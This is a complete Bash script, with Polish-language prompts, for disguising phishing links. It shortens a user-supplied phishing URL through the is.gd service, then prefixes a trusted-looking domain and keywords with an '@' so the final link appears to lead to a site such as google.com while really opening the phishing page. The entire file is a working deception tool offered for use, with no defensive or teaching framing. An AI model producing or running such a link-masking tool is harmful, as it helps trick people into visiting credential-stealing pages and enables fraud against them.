#!/bin/bash
# Bash Script for Hide Phishing URL Created by KP

url_checker() {
    if [ ! "${1//:*}" = http ]; then
        if [ ! "${1//:*}" = https ]; then
            echo -e "\e[31m[!] Nieprawdziwy adres URL. Użyj http albo https.\e[0m"
            exit 1
        fi
    fi
}

echo -e "\n\e[1;31;42m######┌──────────────────────────────────────────────────────────────────┐##### \e[0m" 
echo -e "\e[1;31;42m######│ ________   ________   ________   ________   ________   _________   │##### \e[0m"     
echo -e "\e[1;31;42m######│|\   __  \ |\   __  \ |\   __  \ |\   __  \ |\   __  \ |\___   ___\ │##### \e[0m"  
echo -e "\e[1;31;42m######│\ \  \|\  \\ \  \|\  \\ \  \|\  \\ \  \|\  \\ \  \|\  \\|___ \  \_| │##### \e[0m"  
echo -e "\e[1;31;42m######│ \ \   ____\\ \   __  \\ \   _  _\\ \   _  _\\ \  \\\  \    \ \  \  │##### \e[0m"  
echo -e "\e[1;31;42m######│  \ \  \___| \ \  \ \  \\ \  \\  \|\ \  \\  \|\ \  \\\  \    \ \  \ │##### \e[0m"  
echo -e "\e[1;31;42m######│   \ \__\     \ \__\ \__\\ \__\\ _\ \ \__\\ _\ \ \_______\    \ \__\│##### \e[0m"  
echo -e "\e[1;31;42m######│    \|__|      \|__|\|__| \|__|\|__| \|__|\|__| \|_______|     \|__|│##### \e[0m"  
echo -e "\e[1;31;42m######└─────────────────────────────────────────────────────────────────────┘##### \e[0m \n"
echo -e "\e[1;31;42m ### Phishing URL ###\e[0m \n"
echo -n "Wpisz phishingowy link (tylko http albo https): "
read phish
url_checker $phish
sleep 1
echo "Robienie i Maskowanie phishingowego linku"
echo ""
short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${phish})
shorter=${short#https://}
echo -e "\n\e[1;31;42m ### Maskowanie Domeny ###\e[0m"
echo 'Wpisz domene strony(tylko http albo https), ex: https://google.com, http
://anything.org) :'
echo -en "\e[32m=>\e[0m "
read mask
url_checker $mask
echo -e '\nWpisywanie słów:(Picture, best-pubg-tricks)'
echo -e "\e[31mnie używając spacji kliknij '-' między słowami\e[0m"
echo -en "\e[32m=>\e[0m "
read words
if [[ -z "$words" ]]; then
echo -e "\e[31m[!] No words.\e[0m"
echo -e "\nGenerowanie maskowanego linku...\n"
final=$mask@$shorter
echo -e "Tutaj jest twój link:\e[32m ${final} \e[0m\n"
exit
fi
if [[ "$words" =~ " " ]]; then
echo -e "\e[31m[!] Invalid words. Please avoid space.\e[0m"
echo -e "\nGenerowanie maskowanego linku...\n"
final=$mask@$shorter
echo -e "Tutaj jest twój link:\e[32m ${final} \e[0m\n"
exit
fi
echo -e "\nGenerowanie maskowanego linku...\n"
final=$mask-$words@$shorter
echo -e "Tutaj jest twój link:\e[32m ${final} \e[0m\n"